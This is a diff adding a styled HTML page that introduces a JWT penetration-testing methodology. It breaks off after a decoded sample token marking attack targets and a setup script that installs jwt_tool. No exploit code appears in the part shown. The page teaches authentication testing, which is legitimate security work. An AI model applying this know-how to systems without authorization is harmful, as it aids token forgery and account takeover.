@@ -1,0 +1,1732 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cracking the Token: A Practical Methodology to Test JWT Authentication Vulnerabilities</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Crimson+Pro:ital,wght@0,300;0,400;0,600;1,300;1,400&family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+:root {
+  --bg:        #030507;
+  --bg2:       #070d0f;
+  --surface:   #0b1417;
+  --surface2:  #0f1c20;
+  --border:    #152028;
+  --border2:   #1e3040;
+  --green:     #00ff88;
+  --green-dim: #00c96a;
+  --green-faint: rgba(0,255,136,0.07);
+  --teal:      #0dd3d3;
+  --amber:     #ffb347;
+  --red:       #ff4560;
+  --blue:      #38bdf8;
+  --text:      #d4e8e0;
+  --muted:     #4a7060;
+  --muted2:    #2a4535;
+  --mono:      'JetBrains Mono', monospace;
+  --serif:     'Crimson Pro', serif;
+  --display:   'Bebas Neue', sans-serif;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--serif);
+  font-size: 17px;
+  line-height: 1.75;
+  overflow-x: hidden;
+  cursor: none;
+}
+
+/* ── CUSTOM CURSOR ── */
+#cursor {
+  width: 8px; height: 8px;
+  background: var(--green);
+  border-radius: 50%;
+  position: fixed;
+  pointer-events: none;
+  z-index: 10000;
+  transition: transform 0.15s ease, opacity 0.3s;
+  mix-blend-mode: screen;
+}
+#cursor-ring {
+  width: 32px; height: 32px;
+  border: 1px solid rgba(0,255,136,0.4);
+  border-radius: 50%;
+  position: fixed;
+  pointer-events: none;
+  z-index: 9999;
+  transition: all 0.3s cubic-bezier(0.23,1,0.32,1);
+  mix-blend-mode: screen;
+}
+
+/* ── MATRIX RAIN CANVAS ── */
+#matrix-canvas {
+  position: fixed; top: 0; left: 0;
+  width: 100%; height: 100%;
+  opacity: 0.025;
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* ── PROGRESS ── */
+#progress {
+  position: fixed; top: 0; left: 0; height: 2px;
+  background: linear-gradient(90deg, var(--green), var(--teal));
+  z-index: 1000; width: 0%; transition: width 0.08s linear;
+  box-shadow: 0 0 12px var(--green);
+}
+
+/* ── HEADER ── */
+header {
+  position: relative;
+  min-height: 100vh;
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  align-items: end;
+  padding: 0 7vw 8vh;
+  overflow: hidden;
+  z-index: 1;
+}
+
+.header-glow {
+  position: absolute; inset: 0;
+  background:
+    radial-gradient(ellipse 70% 50% at 30% 60%, rgba(0,255,136,0.05) 0%, transparent 60%),
+    radial-gradient(ellipse 40% 40% at 80% 20%, rgba(13,211,211,0.04) 0%, transparent 50%);
+  pointer-events: none;
+}
+
+.header-scanlines {
+  position: absolute; inset: 0;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 3px,
+    rgba(0,255,136,0.01) 3px,
+    rgba(0,255,136,0.01) 4px
+  );
+  pointer-events: none;
+}
+
+.header-left {
+  position: relative; z-index: 2;
+  padding-bottom: 2rem;
+}
+
+.header-right {
+  position: relative; z-index: 2;
+  padding-bottom: 2rem;
+  padding-left: 4rem;
+}
+
+/* ── JWT VISUAL DIAGRAM ── */
+.jwt-diagram {
+  opacity: 0;
+  animation: fadeIn 1s 1.2s ease forwards;
+}
+
+.jwt-segment {
+  margin-bottom: 0.5rem;
+  display: flex; flex-direction: column; gap: 0.25rem;
+}
+
+.jwt-label {
+  font-family: var(--mono); font-size: 0.6rem;
+  text-transform: uppercase; letter-spacing: 0.15em;
+  margin-bottom: 0.2rem;
+}
+
+.jwt-value {
+  font-family: var(--mono); font-size: 0.7rem;
+  padding: 0.6rem 1rem;
+  word-break: break-all; line-height: 1.6;
+  position: relative; overflow: hidden;
+}
+
+.jwt-value::before {
+  content: '';
+  position: absolute; top: 0; left: 0; width: 3px; height: 100%;
+}
+
+.seg-header .jwt-label { color: var(--red); }
+.seg-header .jwt-value {
+  background: rgba(255,69,96,0.08);
+  border: 1px solid rgba(255,69,96,0.2);
+  color: #ff8fa0;
+}
+.seg-header .jwt-value::before { background: var(--red); }
+
+.seg-payload .jwt-label { color: var(--amber); }
+.seg-payload .jwt-value {
+  background: rgba(255,179,71,0.08);
+  border: 1px solid rgba(255,179,71,0.2);
+  color: #ffcf80;
+}
+.seg-payload .jwt-value::before { background: var(--amber); }
+
+.seg-sig .jwt-label { color: var(--green); }
+.seg-sig .jwt-value {
+  background: var(--green-faint);
+  border: 1px solid rgba(0,255,136,0.2);
+  color: #80ffbb;
+}
+.seg-sig .jwt-value::before { background: var(--green); }
+
+.jwt-connector {
+  text-align: center;
+  font-family: var(--mono); font-size: 1.5rem;
+  color: var(--muted); margin: -0.1rem 0;
+  line-height: 1;
+}
+
+/* ── EYEBROW ── */
+.eyebrow {
+  font-family: var(--mono); font-size: 0.65rem;
+  letter-spacing: 0.2em; text-transform: uppercase;
+  color: var(--green); margin-bottom: 1.5rem;
+  display: flex; align-items: center; gap: 1rem;
+  opacity: 0; animation: fadeUp 0.6s 0.2s ease forwards;
+}
+
+.eyebrow-line { width: 32px; height: 1px; background: var(--green); }
+
+.eyebrow-tag {
+  background: rgba(0,255,136,0.1);
+  border: 1px solid rgba(0,255,136,0.25);
+  padding: 0.2rem 0.75rem; border-radius: 1px;
+}
+
+/* ── H1 ── */
+h1 {
+  font-family: var(--display);
+  font-size: clamp(3.5rem, 6.5vw, 7.5rem);
+  line-height: 0.95;
+  letter-spacing: 0.02em;
+  color: var(--text);
+  margin-bottom: 2rem;
+  opacity: 0; animation: fadeUp 0.9s 0.4s ease forwards;
+}
+
+h1 .accent { color: var(--green); }
+h1 .dim { color: var(--muted); }
+
+.header-desc {
+  font-size: 1.05rem;
+  color: #7aaa90; line-height: 1.7;
+  max-width: 480px;
+  margin-bottom: 2.5rem;
+  opacity: 0; animation: fadeUp 0.7s 0.6s ease forwards;
+}
+
+.header-meta {
+  display: flex; flex-wrap: wrap; gap: 1.5rem;
+  opacity: 0; animation: fadeUp 0.6s 0.8s ease forwards;
+}
+
+.meta-chip {
+  font-family: var(--mono); font-size: 0.65rem;
+  color: var(--muted); letter-spacing: 0.1em;
+  text-transform: uppercase;
+  border: 1px solid var(--border2);
+  padding: 0.3rem 0.8rem;
+  background: var(--surface);
+}
+
+/* ── LAYOUT ── */
+.wrapper {
+  max-width: 1180px; margin: 0 auto;
+  padding: 0 7vw;
+  position: relative; z-index: 1;
+}
+
+.content-grid {
+  display: grid;
+  grid-template-columns: 1fr 260px;
+  gap: 5rem;
+  align-items: start;
+}
+
+/* ── TOC ── */
+.toc-box {
+  position: sticky; top: 5rem;
+  background: var(--surface);
+  border: 1px solid var(--border2);
+  overflow: hidden;
+}
+
+.toc-head {
+  background: var(--surface2);
+  border-bottom: 1px solid var(--border2);
+  padding: 0.75rem 1.25rem;
+  font-family: var(--mono); font-size: 0.6rem;
+  text-transform: uppercase; letter-spacing: 0.18em;
+  color: var(--green);
+  display: flex; align-items: center; gap: 0.75rem;
+}
+
+.toc-head::before {
+  content: '▶'; font-size: 0.5rem;
+}
+
+.toc-nav { padding: 0.5rem 0; }
+
+.toc-nav a {
+  display: flex; align-items: center; gap: 0.75rem;
+  padding: 0.5rem 1.25rem;
+  font-family: var(--mono); font-size: 0.68rem;
+  color: var(--muted); text-decoration: none;
+  border-left: 2px solid transparent;
+  transition: all 0.2s;
+}
+
+.toc-nav a:hover, .toc-nav a.active {
+  color: var(--green); border-left-color: var(--green);
+  background: var(--green-faint);
+}
+
+.toc-index {
+  font-size: 0.58rem; color: var(--muted2);
+  min-width: 1.2rem;
+}
+
+/* ── SECTIONS ── */
+.section {
+  margin-bottom: 5rem;
+  scroll-margin-top: 4.5rem;
+}
+
+.section-badge {
+  display: inline-flex; align-items: center; gap: 0.75rem;
+  margin-bottom: 1.5rem;
+}
+
+.badge-id {
+  font-family: var(--mono); font-size: 0.6rem;
+  text-transform: uppercase; letter-spacing: 0.15em;
+  background: var(--surface2);
+  border: 1px solid var(--border2);
+  padding: 0.35rem 0.9rem;
+  color: var(--muted);
+}
+
+.badge-sev {
+  font-family: var(--mono); font-size: 0.6rem;
+  text-transform: uppercase; letter-spacing: 0.1em;
+  padding: 0.35rem 0.9rem;
+  font-weight: 600;
+}
+
+.crit { background: rgba(255,69,96,0.12); border: 1px solid rgba(255,69,96,0.3); color: var(--red); }
+.high { background: rgba(255,179,71,0.1); border: 1px solid rgba(255,179,71,0.3); color: var(--amber); }
+.med  { background: rgba(56,189,248,0.1); border: 1px solid rgba(56,189,248,0.3); color: var(--blue); }
+
+.section-title {
+  font-family: var(--display);
+  font-size: clamp(2rem, 3.5vw, 3.2rem);
+  letter-spacing: 0.03em;
+  line-height: 1;
+  color: var(--text);
+  margin-bottom: 0.75rem;
+}
+
+.section-sub {
+  font-size: 1rem; color: #5a8870;
+  max-width: 640px; line-height: 1.7;
+  margin-bottom: 2.5rem;
+  font-weight: 300;
+}
+
+/* ── INTRO TEXT ── */
+.lead {
+  font-size: 1.25rem; font-weight: 300;
+  color: #a0c8b0; line-height: 1.7;
+  border-left: 2px solid var(--green);
+  padding-left: 1.75rem;
+  margin-bottom: 2rem;
+  font-style: italic;
+}
+
+p {
+  font-size: 1rem; color: #7aaa90;
+  line-height: 1.85; margin-bottom: 1.25rem;
+  font-weight: 300;
+}
+
+strong { color: var(--text); font-weight: 600; }
+
+/* ── DIVIDER ── */
+.divider {
+  display: flex; align-items: center; gap: 1rem;
+  margin: 4rem 0;
+}
+.divider::before, .divider::after {
+  content: ''; flex: 1; height: 1px;
+  background: linear-gradient(90deg, transparent, var(--border2));
+}
+.divider::after { background: linear-gradient(90deg, var(--border2), transparent); }
+.divider-icon {
+  font-family: var(--mono); font-size: 0.65rem;
+  color: var(--muted); letter-spacing: 0.2em;
+  white-space: nowrap;
+}
+
+/* ── JWT ANATOMY BOX ── */
+.anatomy-box {
+  background: var(--surface);
+  border: 1px solid var(--border2);
+  padding: 2rem;
+  margin: 2rem 0;
+  position: relative;
+}
+
+.anatomy-box::after {
+  content: 'JWT_ANATOMY.decode()';
+  position: absolute; top: -0.6rem; left: 1.5rem;
+  font-family: var(--mono); font-size: 0.6rem;
+  color: var(--green); background: var(--bg);
+  padding: 0 0.5rem; letter-spacing: 0.1em;
+}
+
+/* ── TEST CARDS ── */
+.test-cards {
+  display: grid; gap: 1px;
+  background: var(--border);
+  border: 1px solid var(--border2);
+  margin: 2rem 0;
+}
+
+.test-card {
+  background: var(--surface);
+  padding: 1.5rem;
+  display: grid;
+  grid-template-columns: auto 1fr auto;
+  gap: 1.25rem;
+  align-items: start;
+  transition: background 0.2s;
+  cursor: default;
+}
+
+.test-card:hover { background: var(--surface2); }
+
+.test-num {
+  font-family: var(--mono); font-size: 1.8rem;
+  font-weight: 700; color: var(--border2);
+  line-height: 1; padding-top: 0.1rem;
+  transition: color 0.2s;
+}
+.test-card:hover .test-num { color: var(--green); }
+
+.test-info {}
+
+.test-name {
+  font-family: var(--mono); font-weight: 600;
+  font-size: 0.82rem; color: var(--text);
+  margin-bottom: 0.35rem; line-height: 1.3;
+}
+
+.test-desc {
+  font-size: 0.85rem; color: var(--muted);
+  line-height: 1.5; font-family: var(--serif);
+  font-weight: 300;
+}
+
+.test-tool {
+  font-family: var(--mono); font-size: 0.62rem;
+  color: var(--teal); white-space: nowrap;
+  padding: 0.3rem 0.7rem;
+  background: rgba(13,211,211,0.07);
+  border: 1px solid rgba(13,211,211,0.15);
+  align-self: start;
+}
+
+/* ── CODE BLOCK ── */
+.code-block {
+  background: #020507;
+  border: 1px solid var(--border2);
+  margin: 2rem 0;
+  overflow-x: auto;
+  position: relative;
+}
+
+.code-bar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 0.6rem 1.25rem;
+  background: var(--surface2);
+  border-bottom: 1px solid var(--border2);
+}
+
+.code-lang {
+  font-family: var(--mono); font-size: 0.6rem;
+  color: var(--green); text-transform: uppercase;
+  letter-spacing: 0.15em;
+}
+
+.code-filename {
+  font-family: var(--mono); font-size: 0.62rem;
+  color: var(--muted);
+}
+
+.code-body {
+  padding: 1.5rem 1.75rem;
+  font-family: var(--mono); font-size: 0.76rem;
+  line-height: 2.0; color: #5a8870;
+}
+
+.t-comment { color: #2a5040; font-style: italic; }
+.t-keyword { color: #c678dd; }
+.t-string  { color: #98c379; }
+.t-func    { color: var(--green); }
+.t-var     { color: #e06c75; }
+.t-num     { color: var(--amber); }
+.t-key     { color: var(--teal); }
+.t-header  { color: var(--red); }
+.t-output  { color: var(--amber); }
+.t-prompt  { color: var(--green); }
+
+/* ── ATTACK FLOW ── */
+.flow-diagram {
+  background: var(--surface);
+  border: 1px solid var(--border2);
+  padding: 2rem;
+  margin: 2rem 0;
+  overflow-x: auto;
+}
+
+.flow-title {
+  font-family: var(--mono); font-size: 0.6rem;
+  text-transform: uppercase; letter-spacing: 0.18em;
+  color: var(--green); margin-bottom: 1.5rem;
+}
+
+.flow-steps {
+  display: flex; gap: 0;
+  flex-wrap: nowrap;
+  min-width: max-content;
+}
+
+.flow-step {
+  display: flex; flex-direction: column;
+  align-items: center;
+}
+
+.flow-box {
+  background: var(--surface2);
+  border: 1px solid var(--border2);
+  padding: 0.75rem 1.1rem;
+  font-family: var(--mono); font-size: 0.68rem;
+  color: var(--text); text-align: center;
+  white-space: nowrap; min-width: 130px;
+  position: relative;
+}
+
+.flow-box.attack {
+  border-color: rgba(255,69,96,0.4);
+  background: rgba(255,69,96,0.07);
+  color: #ff8fa0;
+}
+
+.flow-box.success {
+  border-color: rgba(0,255,136,0.3);
+  background: var(--green-faint);
+  color: #80ffbb;
+}
+
+.flow-arrow {
+  display: flex; align-items: center;
+  color: var(--muted); font-size: 1.2rem;
+  padding: 0 0.3rem;
+  align-self: center;
+}
+
+.flow-label {
+  font-family: var(--mono); font-size: 0.55rem;
+  color: var(--muted); margin-top: 0.4rem;
+  text-align: center;
+}
+
+/* ── PAYLOAD TERMINAL ── */
+.terminal {
+  background: #020507;
+  border: 1px solid var(--border2);
+  margin: 2rem 0;
+  box-shadow: 0 0 40px rgba(0,255,136,0.03);
+}
+
+.terminal-bar {
+  display: flex; align-items: center; gap: 0.75rem;
+  padding: 0.65rem 1.25rem;
+  background: var(--surface2);
+  border-bottom: 1px solid var(--border2);
+}
+
+.t-dots { display: flex; gap: 0.4rem; }
+.t-dots span { width: 10px; height: 10px; border-radius: 50%; }
+.t-dots span:nth-child(1) { background: #ff5f57; }
+.t-dots span:nth-child(2) { background: #ffbd2e; }
+.t-dots span:nth-child(3) { background: #28ca41; }
+
+.t-title {
+  font-family: var(--mono); font-size: 0.62rem;
+  color: var(--muted); letter-spacing: 0.1em;
+}
+
+.terminal-body { padding: 1.25rem 1.5rem; }
+
+.t-line {
+  font-family: var(--mono); font-size: 0.76rem;
+  line-height: 1.9; display: flex;
+  gap: 0.75rem; align-items: flex-start;
+}
+
+.t-line .prompt-sym { color: var(--green); flex-shrink: 0; }
+.t-line .cmd { color: #a8d8b8; }
+.t-line .t-comment { color: #2a5040; }
+
+.t-output-line {
+  font-family: var(--mono); font-size: 0.72rem;
+  line-height: 1.8; color: var(--amber);
+  padding-left: 1.2rem;
+}
+
+/* ── VS COMPARISON ── */
+.vs-wrap {
+  display: grid; grid-template-columns: 1fr 1fr;
+  gap: 1px; background: var(--border);
+  border: 1px solid var(--border2);
+  margin: 2rem 0;
+}
+
+.vs-panel { background: var(--surface); padding: 1.5rem; }
+
+.vs-header {
+  font-family: var(--mono); font-size: 0.62rem;
+  text-transform: uppercase; letter-spacing: 0.12em;
+  margin-bottom: 1rem; padding-bottom: 0.6rem;
+  border-bottom: 1px solid var(--border2);
+  display: flex; align-items: center; gap: 0.5rem;
+}
+
+.vs-vuln .vs-header { color: var(--red); }
+.vs-safe .vs-header { color: var(--green); }
+
+.vs-code {
+  font-family: var(--mono); font-size: 0.75rem;
+  line-height: 1.8; word-break: break-all;
+}
+
+.vs-vuln .vs-code { color: #ff8fa0; }
+.vs-safe .vs-code { color: #80ffbb; }
+
+/* ── CALLOUTS ── */
+.callout {
+  display: flex; gap: 1.25rem;
+  padding: 1.25rem 1.5rem;
+  margin: 2rem 0;
+  border: 1px solid;
+  position: relative;
+}
+
+.callout::before {
+  content: '';
+  position: absolute; left: 0; top: 0; bottom: 0;
+  width: 2px;
+}
+
+.callout-crit { background: rgba(255,69,96,0.05); border-color: rgba(255,69,96,0.2); }
+.callout-crit::before { background: var(--red); }
+.callout-warn { background: rgba(255,179,71,0.05); border-color: rgba(255,179,71,0.2); }
+.callout-warn::before { background: var(--amber); }
+.callout-tip  { background: var(--green-faint); border-color: rgba(0,255,136,0.18); }
+.callout-tip::before  { background: var(--green); }
+.callout-info { background: rgba(56,189,248,0.05); border-color: rgba(56,189,248,0.2); }
+.callout-info::before { background: var(--blue); }
+
+.callout-icon { font-size: 0.9rem; flex-shrink: 0; padding-top: 0.15rem; }
+.callout-text { font-size: 0.88rem; line-height: 1.7; font-family: var(--serif); font-weight: 300; }
+
+.callout-crit .callout-text { color: #ffa0b0; }
+.callout-warn .callout-text { color: #ffd090; }
+.callout-tip  .callout-text { color: #80e8b0; }
+.callout-info .callout-text { color: #90d0f0; }
+
+/* ── CHECKLIST ── */
+.checklist {
+  background: var(--surface);
+  border: 1px solid var(--border2);
+  padding: 1.5rem;
+  margin: 2rem 0;
+}
+
+.checklist-title {
+  font-family: var(--mono); font-size: 0.62rem;
+  text-transform: uppercase; letter-spacing: 0.18em;
+  color: var(--green); margin-bottom: 1rem;
+  padding-bottom: 0.75rem;
+  border-bottom: 1px solid var(--border2);
+  display: flex; align-items: center; gap: 0.75rem;
+}
+
+.checklist-title::before { content: '[ ]'; color: var(--green); }
+
+.check-item {
+  display: flex; gap: 0.9rem; align-items: flex-start;
+  padding: 0.5rem 0;
+  border-bottom: 1px solid rgba(21,32,40,0.7);
+  transition: background 0.2s;
+  border-radius: 1px;
+}
+
+.check-item:last-child { border-bottom: none; }
+.check-item:hover { background: var(--green-faint); }
+
+.check-box {
+  font-family: var(--mono); font-size: 0.75rem;
+  color: var(--muted); flex-shrink: 0;
+  margin-top: 0.15rem;
+}
+
+.check-text {
+  font-size: 0.88rem; color: #7aaa90;
+  line-height: 1.6; font-family: var(--serif);
+  font-weight: 300;
+}
+
+/* ── VULN TABLE ── */
+.vuln-table {
+  width: 100%; border-collapse: collapse;
+  font-size: 0.85rem; margin: 2rem 0;
+}
+
+.vuln-table thead tr {
+  background: var(--surface2);
+  border-bottom: 1px solid var(--border2);
+}
+
+.vuln-table th {
+  padding: 0.75rem 1rem;
+  font-family: var(--mono); font-size: 0.6rem;
+  text-transform: uppercase; letter-spacing: 0.12em;
+  color: var(--green); text-align: left; font-weight: 500;
+}
+
+.vuln-table td {
+  padding: 0.85rem 1rem;
+  border-bottom: 1px solid rgba(21,32,40,0.9);
+  color: #7aaa90; line-height: 1.6; vertical-align: top;
+  font-family: var(--serif); font-weight: 300;
+}
+
+.vuln-table tr:last-child td { border-bottom: none; }
+.vuln-table tr:nth-child(even) td { background: rgba(11,20,23,0.6); }
+.vuln-table td:first-child { font-family: var(--mono); font-size: 0.8rem; color: var(--text); font-weight: 500; }
+
+/* ── STATS ── */
+.stats-row {
+  display: grid; grid-template-columns: repeat(4, 1fr);
+  gap: 1px; background: var(--border);
+  border: 1px solid var(--border2);
+  margin: 4rem 0;
+}
+
+.stat {
+  background: var(--surface);
+  padding: 2rem 1.5rem;
+  position: relative; overflow: hidden;
+}
+
+.stat::after {
+  content: '';
+  position: absolute; bottom: 0; left: 0; right: 0; height: 1px;
+  background: var(--green); transform: scaleX(0); transform-origin: left;
+  transition: transform 0.4s ease;
+  box-shadow: 0 0 8px var(--green);
+}
+
+.stat:hover::after { transform: scaleX(1); }
+
+.stat-n {
+  font-family: var(--mono); font-size: 2.8rem;
+  font-weight: 700; color: var(--green);
+  line-height: 1; margin-bottom: 0.5rem;
+  display: block;
+  text-shadow: 0 0 30px rgba(0,255,136,0.3);
+}
+
+.stat-l {
+  font-family: var(--mono); font-size: 0.65rem;
+  color: var(--muted); text-transform: uppercase;
+  letter-spacing: 0.1em;
+}
+
+/* ── STEP BOX ── */
+.steps { display: flex; flex-direction: column; gap: 1px; margin: 2rem 0; }
+
+.step {
+  display: grid; grid-template-columns: 60px 1fr;
+  background: var(--border); gap: 1px;
+}
+
+.step-num {
+  background: var(--surface2);
+  display: flex; align-items: center; justify-content: center;
+  font-family: var(--mono); font-size: 1.5rem;
+  font-weight: 700; color: var(--green-dim);
+  padding: 1.5rem;
+}
+
+.step-content {
+  background: var(--surface);
+  padding: 1.25rem 1.5rem;
+}
+
+.step-title {
+  font-family: var(--mono); font-size: 0.78rem;
+  font-weight: 600; color: var(--text);
+  margin-bottom: 0.4rem;
+}
+
+.step-body {
+  font-size: 0.88rem; color: var(--muted);
+  line-height: 1.65; font-family: var(--serif); font-weight: 300;
+}
+
+/* ── ANIMATIONS ── */
+@keyframes fadeUp {
+  from { opacity: 0; transform: translateY(18px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to   { opacity: 1; }
+}
+
+.reveal {
+  opacity: 0; transform: translateY(20px);
+  transition: opacity 0.7s ease, transform 0.7s ease;
+}
+.reveal.vis { opacity: 1; transform: none; }
+
+/* ── CODE INLINE ── */
+code {
+  font-family: var(--mono); font-size: 0.8em;
+  background: var(--surface2); color: var(--green-dim);
+  padding: 0.1em 0.4em; border: 1px solid var(--border2);
+}
+
+/* ── FOOTER ── */
+footer {
+  position: relative; z-index: 1;
+  border-top: 1px solid var(--border2);
+  padding: 3rem 7vw;
+  display: flex; justify-content: space-between;
+  align-items: center; flex-wrap: wrap; gap: 1rem;
+  margin-top: 6rem;
+}
+
+.footer-id {
+  font-family: var(--mono); font-size: 0.7rem;
+  color: var(--muted); letter-spacing: 0.1em;
+}
+
+.footer-links { display: flex; gap: 2.5rem; list-style: none; }
+
+.footer-links a {
+  font-family: var(--mono); font-size: 0.62rem;
+  color: var(--muted); text-decoration: none;
+  text-transform: uppercase; letter-spacing: 0.12em;
+  transition: color 0.2s;
+}
+.footer-links a:hover { color: var(--green); }
+
+/* ── RESPONSIVE ── */
+@media (max-width: 960px) {
+  header { grid-template-columns: 1fr; padding-bottom: 5vh; }
+  .header-right { display: none; }
+  .content-grid { grid-template-columns: 1fr; }
+  .toc-box { display: none; }
+  .vs-wrap { grid-template-columns: 1fr; }
+  .stats-row { grid-template-columns: repeat(2,1fr); }
+  .flow-steps { overflow-x: auto; }
+}
+</style>
+</head>
+<body>
+
+<!-- CURSOR -->
+<div id="cursor"></div>
+<div id="cursor-ring"></div>
+
+<!-- MATRIX CANVAS -->
+<canvas id="matrix-canvas"></canvas>
+
+<!-- PROGRESS -->
+<div id="progress"></div>
+
+<!-- ═══ HERO ═══ -->
+<header>
+  <div class="header-glow"></div>
+  <div class="header-scanlines"></div>
+
+  <div class="header-left">
+    <div class="eyebrow">
+      <div class="eyebrow-line"></div>
+      <span class="eyebrow-tag">Authentication Security</span>
+      Penetration Testing
+    </div>
+
+    <h1>
+      CRACKING<br>
+      THE <span class="accent">TOKEN</span><br>
+      <span class="dim">///</span>
+    </h1>
+
+    <p class="header-desc">
+      A practical, step-by-step methodology to discover, exploit, and remediate JWT authentication vulnerabilities — from algorithm confusion to secret brute-forcing.
+    </p>
+
+    <div class="header-meta">
+      <span class="meta-chip">20 min read</span>
+      <span class="meta-chip">9 Attack Classes</span>
+      <span class="meta-chip">50+ Test Cases</span>
+      <span class="meta-chip">RFC 7519</span>
+    </div>
+  </div>
+
+  <div class="header-right">
+    <div class="jwt-diagram">
+      <div class="jwt-segment seg-header">
+        <div class="jwt-label">// HEADER</div>
+        <div class="jwt-value">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</div>
+      </div>
+      <div class="jwt-connector">·</div>
+      <div class="jwt-segment seg-payload">
+        <div class="jwt-label">// PAYLOAD</div>
+        <div class="jwt-value">eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTA4NDAwMDB9</div>
+      </div>
+      <div class="jwt-connector">·</div>
+      <div class="jwt-segment seg-sig">
+        <div class="jwt-label">// SIGNATURE ← attack surface</div>
+        <div class="jwt-value">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- ═══ MAIN ═══ -->
+<div class="wrapper" style="padding-top:6rem">
+<div class="content-grid">
+
+<!-- ARTICLE -->
+<article>
+
+  <!-- INTRO -->
+  <section class="section reveal" id="intro">
+    <p class="lead">JSON Web Tokens are everywhere. They're also broken in production more often than any other authentication mechanism — because the JWT specification gives developers dozens of ways to get it catastrophically wrong.</p>
+
+    <p>From <strong>algorithm confusion</strong> that lets attackers forge tokens signed with the server's public key, to <strong>weak secrets</strong> crackable in seconds with a $50 GPU, JWT vulnerabilities are consistently among the highest-severity findings in API security assessments. Yet most developers have never systematically tested their JWT implementation.</p>
+
+    <p>This guide gives you a structured, end-to-end testing methodology — covering all major JWT attack classes, with step-by-step procedures, Burp Suite workflows, Python exploit scripts, and concrete remediation controls mapped to each vulnerability.</p>
+
+    <div class="stats-row">
+      <div class="stat"><span class="stat-n">9</span><span class="stat-l">Attack Classes</span></div>
+      <div class="stat"><span class="stat-n">50+</span><span class="stat-l">Test Cases</span></div>
+      <div class="stat"><span class="stat-n">3</span><span class="stat-l">Critical Severity</span></div>
+      <div class="stat"><span class="stat-n">RFC 7519</span><span class="stat-l">Spec Coverage</span></div>
+    </div>
+  </section>
+
+  <div class="divider"><span class="divider-icon">// JWT_ANATOMY</span></div>
+
+  <!-- ANATOMY -->
+  <section class="section reveal" id="anatomy">
+    <div class="section-badge">
+      <span class="badge-id">PREREQUISITE</span>
+    </div>
+    <div class="section-title">JWT ANATOMY</div>
+    <p class="section-sub">Before attacking, understand what you're attacking.</p>
+
+    <p>A JWT is three Base64URL-encoded JSON objects joined by dots: <code>header.payload.signature</code>. The header specifies the algorithm. The payload carries claims. The signature proves integrity — and it's the primary attack target.</p>
+
+    <div class="anatomy-box">
+      <div class="code-body" style="padding:0">
+<span class="t-comment">// DECODED JWT STRUCTURE</span>
+
+<span class="t-comment">// 1. HEADER — tells the server HOW to verify</span>
+{
+  <span class="t-key">"alg"</span>: <span class="t-string">"HS256"</span>,   <span class="t-comment">← ATTACK SURFACE: can be manipulated</span>
+  <span class="t-key">"typ"</span>: <span class="t-string">"JWT"</span>
+}
+
+<span class="t-comment">// 2. PAYLOAD — claims about the user</span>
+{
+  <span class="t-key">"sub"</span>:  <span class="t-string">"user_123"</span>,
+  <span class="t-key">"role"</span>: <span class="t-string">"user"</span>,        <span class="t-comment">← privilege escalation target</span>
+  <span class="t-key">"iat"</span>:  <span class="t-num">1710840000</span>,
+  <span class="t-key">"exp"</span>:  <span class="t-num">1710843600</span>     <span class="t-comment">← expiry bypass target</span>
+}
+
+<span class="t-comment">// 3. SIGNATURE — HMAC-SHA256(base64(header) + "." + base64(payload), secret)</span>
+<span class="t-func">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
+      </div>
+    </div>
+
+    <div class="callout callout-info">
+      <span class="callout-icon">ℹ️</span>
+      <div class="callout-text"><strong>Key insight:</strong> The header and payload are NOT encrypted — they're only Base64URL encoded. Any user can decode them. This means an attacker can read every claim in a JWT without any key material. Sensitive data in JWT payloads is fully exposed.</div>
+    </div>
+  </section>
+
+  <div class="divider"><span class="divider-icon">// PRE_ENGAGEMENT</span></div>
+
+  <!-- SETUP -->
+  <section class="section reveal" id="setup">
+    <div class="section-badge"><span class="badge-id">SETUP</span></div>
+    <div class="section-title">PRE-ENGAGEMENT SETUP</div>
+
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-title">Install JWT Testing Tools</div>
+          <div class="step-body">Install jwt_tool, Burp Suite JWT Editor extension, and python-jwt for scripting attacks.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-title">Capture a Valid Token</div>
+          <div class="step-body">Authenticate via the application and intercept the JWT in Burp Suite. Confirm you have a valid baseline token before beginning attack testing.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-title">Decode and Catalogue</div>
+          <div class="step-body">Decode the header and payload. Document the algorithm, all claims, token lifetime, and any custom headers (kid, jku, x5u).</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-title">Set Up Monitoring</div>
+          <div class="step-body">Configure Burp Suite to capture all requests containing Authorization: Bearer headers. Set up match-and-replace rules for rapid token substitution.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-bar">
+        <span class="code-lang">Bash</span>
+        <span class="code-filename">setup.sh</span>
+      </div>
+      <div class="code-body">
+<span class="t-comment"># Install jwt_tool — the primary JWT pentesting toolkit</span>
+<span class="t-prompt">$</span> git clone https://github.com/ticarpi/jwt_tool
+<span class="t-prompt">$</span> pip3 install -r jwt_tool/requirements.txt
+
+<span class="t-comment"># Decode and inspect a token immediately</span>
+<span class="t-prompt">$</span> python3 jwt_tool.py &lt;YOUR_TOKEN&gt;
+
